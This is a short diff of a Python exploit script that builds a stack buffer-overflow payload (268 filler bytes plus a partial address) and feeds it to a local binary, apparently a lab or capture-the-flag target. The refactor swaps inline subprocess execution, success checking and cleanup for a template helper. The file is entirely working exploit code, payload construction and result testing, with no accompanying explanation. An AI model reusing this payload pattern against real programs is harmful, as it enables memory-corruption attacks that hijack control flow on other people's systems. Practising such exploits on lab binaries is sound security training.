@@ -1,15 +1,7 @@
-import subprocess
+from templates import buff_overflow
 
-with open("payload", "wb") as file:
-    file.write(b"a" * (256 + 12) + b"\x20\x94\x06")  # buffer is 256B, overwrite_me was 12B away
 
-print("running executable")
-out = subprocess.run("./a.out < payload", shell=True, capture_output=True, text=True)
-print(out.stdout)
+payload = (b"a" * (256 + 12)) + b"\x20\x94\x06"  # buffer is 256B, there's 12B between the buffer and overwrite_me
+fail_str = "a.out"  # a.out is always going to be printed by ls, so it's a good way to see if it was called
 
-if "a.out" not in out.stdout:  # a.out is always in the ls call, so it's a good check to see if the exploit failed
-    print("Exploited!")
-else:
-    print("Exploit failed!")
-
-subprocess.run(["rm", "payload"])  # clean up temp files
+buff_overflow(payload, fail_str)
